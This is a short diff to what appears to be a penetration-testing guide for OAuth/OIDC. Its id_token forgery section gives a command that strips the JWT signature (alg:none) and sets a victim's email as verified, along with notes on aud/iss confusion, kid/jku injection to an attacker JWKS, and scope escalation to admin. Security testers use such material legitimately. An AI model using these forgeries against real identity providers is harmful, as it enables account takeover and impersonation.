@@ -115,8 +115,8 @@ scope=openid profile email  →  ... offline_access admin read:all   # escalatio
 ## 6. OIDC id_token forgery (JWT — full detail in ../JWT/)
 
 ```bash
-# alg:none  (strip signature)
-python3 ../JWT/poc/jwt_tamper.py --token "$IDTOKEN" --alg none --set email=victim@target.com --set email_verified=true
+# alg:none  (strip signature) — this kit's own helper:
+python3 poc/idtoken_tamper.py --token "$IDTOKEN" --alg-none --set email=victim@target.com --set email_verified=true
 # aud/iss confusion — present an id_token minted for a client you control:
 #   change nothing but reuse it at THIS SP; if aud not pinned to this client_id → accepted
 # kid / jku injection → attacker JWKS (see ../JWT/JWT_TESTING_GUIDE.md §jku/kid)
